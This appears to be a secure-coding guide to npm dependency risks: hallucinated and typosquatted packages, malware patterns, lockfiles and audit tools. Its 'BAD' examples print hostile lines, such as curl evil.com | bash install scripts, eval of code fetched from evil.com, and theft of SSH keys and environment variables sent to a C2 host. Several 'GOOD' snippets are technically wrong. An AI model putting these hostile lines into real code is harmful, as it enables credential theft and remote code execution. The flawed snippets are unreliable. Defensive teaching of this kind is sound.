# Dependency Security

**CWE:** CWE-1104 (Unmaintained Components), CWE-1357 (Vulnerable Dependencies), CWE-506 (Embedded Malicious Code), CWE-829 (Inclusion from Untrusted Sphere)
**OWASP:** A06:2021 Vulnerable and Outdated Components

## Slopsquatting (AI-Hallucinated Packages)

AI models sometimes hallucinate package names that don't exist. Attackers register these names with malicious code.

```typescript
// BAD: Installing AI-suggested package without verification
// AI suggests: npm install express-middleware-validator
// This package may not exist or be malicious!

// GOOD: Verify package before installing
// 1. Check npm registry
npm view express-middleware-validator

// 2. If not found or suspicious, research alternatives
npm search express validator

// 3. Check package health
// - Weekly downloads (should be >1000 for popular packages)
// - Last publish date (avoid abandoned packages)
// - GitHub stars and activity
// - Maintainer reputation
```

## Typosquatting

```typescript
// BAD: Typos in package names
npm install lodahs     // Typo of 'lodash'
npm install expresss   // Typo of 'express'
npm install coler      // Typo of 'color'

// GOOD: Double-check package names
// Use official documentation links
// Copy package names from npmjs.com

// GOOD: Review what you're installing
npm install lodash --dry-run  // See what would be installed
```

## NPM Malware Patterns

### BAD - Remote Code Execution Backdoors

```typescript
// Installing suspicious packages
npm install isite@2024.12.3  // Sends system data to remote server, executes returned JS

// Obfuscated eval in deps
const code = fetch('http://evil.com/code').then(eval);  // Hidden in lib/eval.js

// Persistence mechanisms
import os from 'os';
os.system('useradd hiddenuser');  // Creates backdoor users

// Credential exfiltration
const creds = readFileSync('/home/user/.ssh/id_rsa');
sendToC2(creds);  // Steals keys

// Wallet seed harvesting
const wallets = glob('**/wallet.dat');
exfiltrate(wallets);

// Root password changes
exec('echo root:evilpass | chpasswd');

// Dynamic requires
require(fetch('http://c2/payload'));  // Loads remote malware

// Env var theft
sendToC2(process.env);  // AWS keys, etc.

// File archiving/exfil
zip('/home', 'data.zip'); upload('evil.com');

// Silent directory walks
fs.walk(process.cwd(), stealSecrets);  // Found in jito-validator-sdk
```

### GOOD - Malware Prevention

```typescript
// Audit before install
npm audit isite

// Lock exact versions
"dependencies": { "safe-pkg": "1.2.3" }  // No ranges

// No exec in code
// Avoid child_process entirely

// Sandbox deps
import vm from 'vm';
vm.runInNewContext(code, sandbox);  // Limited scope

// Secret scanning
npx trufflehog filesystem .

// Dependency scanning
npx snyk test

// CI audit
// .github/workflows: npm audit --audit-level=critical || exit 1

// Ignore scripts
npm install --ignore-scripts

// Airgapped installs
// Offline npm mirror for prod

// Runtime monitoring
process.on('uncaughtException', logAndExit);
```

## Invisible Dependencies (PhantomRaven)

### BAD

```typescript
// Remote dynamic deps
const dep = await fetch('npm.jpartifacts.com/pkg');
require(dep);  // Hidden malware load

// Obfuscated requires
const _0x123 = 'ht' + 'tp://evil'; require(_0x123);

// Unicode hidden chars
require('evil-pkg');  // Zero-width joiner hides

// package.json with remote scripts
"scripts": { "install": "curl evil.com | bash" }

// Typo in deps
"lodashh": "^4.17.0"  // Malicious squat

// Deep nested deps
// pkg-a -> pkg-b -> malicious-c

// Postinstall hooks
"postinstall": "node backdoor.js"

// Env-based triggers
if (process.env.CI) stealSecrets();

// Time-bombs
setTimeout(malware, 86400000);  // Activates later

// Conditional malice
if (os.platform() === 'linux') exploit();
```

### GOOD

```typescript
// Flatten deps
npx depcheck;  // Remove unused

// Lockfile integrity
npm ci  // Exact installs

// Dep scanning tools
npx owlspect  // Detect hidden deps

// No remote scripts
// Manual review package.json

// Scoped packages
"@org/safe-pkg"

// SBOM generation
npx cyclonedx-npm

// Disable postinstall
NPM_CONFIG_IGNORE_SCRIPTS=1 npm i

// Env sanitization
delete process.env.CI;

// Time limits
// CI timeout after 5min

// Platform checks
if (os.platform() !== 'win32') exit();  // For testing
```

## Hashing/Verification Weaknesses

### BAD

```typescript
// Silent file walks in verify functions
bs58.verifySha256String();  // Recurses project, steals secrets

// Weak hashes
crypto.createHash('md5').update(secret);

// No integrity checks
download('pkg', noVerify=true);

// User-controlled hashes
hash = req.body.hash; if (hash === expected) {}

// Exposed verify functions
export function verify(input) { walkDir(); }  // Hidden malice

// Base58 decoding flaws
decodeBase58(userInput);  // Injection

// No salt in hashes
sha256(password);

// Sync crypto ops
crypto.pbkdf2Sync();  // Blocks loop

// Hardcoded salts
salt = 'fixed';

// Short keys
key = crypto.randomBytes(8);
```

### GOOD

```typescript
// Async crypto
crypto.pbkdf2(async);

// Argon2 hashing
import argon2 from 'argon2';
argon2.hash(password);

// Integrity verification
if (hash !== crypto.createHash('sha512').update(file).digest('hex')) invalid();

// No exports of risky funcs
// Private methods only

// Input sanitization
if (!/^[a-z0-9]+$/i.test(input)) invalid();

// Random salts
salt = crypto.randomBytes(16);

// Long keys
key = crypto.randomBytes(32);

// Scrypt alternative
crypto.scrypt();

// No sync in prod
// Flag for dev only

// Limit walks
fs.readdirSync(dir, { maxDepth: 1 });
```

## Dependency Auditing

```bash
# GOOD: Regular security audits
npm audit                    # Check for vulnerabilities
npm audit fix               # Auto-fix where possible
npm audit fix --force       # Fix even with breaking changes (review first!)

# GOOD: Check outdated packages
npm outdated                # List outdated packages

# GOOD: Use lockfile integrity
npm ci                      # Install from lockfile (CI environments)
```

## Package Verification Checklist

Before adding any new dependency:

```typescript
// GOOD: Verification script
async function verifyPackage(packageName: string): Promise<void> {
  // This is conceptual - perform these checks manually or with tools

  // 1. Does it exist on npm?
  // npm view <package> - should return package info

  // 2. Weekly downloads > 1000? (for "popular" packages)
  // Check npmjs.com/<package>

  // 3. Last publish < 2 years ago?
  // Stale packages may have unpatched vulnerabilities

  // 4. Open issues / security issues?
  // Check GitHub issues tab

  // 5. Maintained by known org/individual?
  // Verify maintainer reputation

  // 6. Does it match what you expected?
  // Read the README, check the repository
}
```

## Automated Dependency Updates

```yaml
# GOOD: Dependabot configuration (.github/dependabot.yml)
version: 2
updates:
  - package-ecosystem: "npm"
    directory: "/"
    schedule:
      interval: "weekly"
    open-pull-requests-limit: 10
    groups:
      development-dependencies:
        patterns:
          - "@types/*"
          - "eslint*"
          - "prettier"
```

```yaml
# GOOD: Renovate configuration (renovate.json)
{
  "extends": ["config:base"],
  "vulnerabilityAlerts": { "enabled": true },
  "packageRules": [
    {
      "matchUpdateTypes": ["patch", "minor"],
      "automerge": true
    }
  ]
}
```

## Lockfile Security

```typescript
// BAD: Ignoring lockfile
// .gitignore
package-lock.json  // Don't ignore this!

// GOOD: Commit and use lockfile
git add package-lock.json  // Always commit
npm ci                     // Use in CI (installs from lockfile exactly)

// GOOD: Enable lockfile verification
// package.json
{
  "scripts": {
    "preinstall": "npx npm-lockfile-lint --type npm --path package-lock.json --allowed-hosts npm yarn"
  }
}
```

## Minimal Dependencies

```typescript
// BAD: Heavy dependencies for simple tasks
import _ from 'lodash';           // 70KB for one function
const isEmpty = _.isEmpty(obj);

import moment from 'moment';      // 300KB+ for date formatting
const formatted = moment().format('YYYY-MM-DD');

// GOOD: Native alternatives or lighter packages
// Native
const isEmpty = obj == null || Object.keys(obj).length === 0;
const formatted = new Date().toISOString().split('T')[0];

// Or use lighter alternatives
import { isEmpty } from 'lodash-es/isEmpty';  // Tree-shakeable
import { format } from 'date-fns';            // Modular
```

## Runtime Dependency Checks

```typescript
// GOOD: Check for known vulnerabilities at startup (optional)
import { execSync } from 'child_process';

function checkDependencies(): void {
  try {
    const result = execSync('npm audit --json', { encoding: 'utf-8' });
    const audit = JSON.parse(result);
    if (audit.metadata.vulnerabilities.high > 0 ||
        audit.metadata.vulnerabilities.critical > 0) {
      console.warn('High/Critical vulnerabilities detected. Run npm audit.');
    }
  } catch {
    // Audit command failed or found issues - log warning
  }
}
```

## Summary

1. **Verify packages exist** before installing AI-suggested dependencies
2. **Check package health** - downloads, last update, maintainer reputation
3. **Run npm audit regularly** and fix vulnerabilities
4. **Use lockfiles** - commit and use `npm ci` in CI
5. **Minimize dependencies** - use native APIs when possible
6. **Enable automated updates** - Dependabot or Renovate
7. **Ignore scripts in CI/prod** - NPM_CONFIG_IGNORE_SCRIPTS=1
8. **Scan for malware** - trufflehog, snyk, owlspect
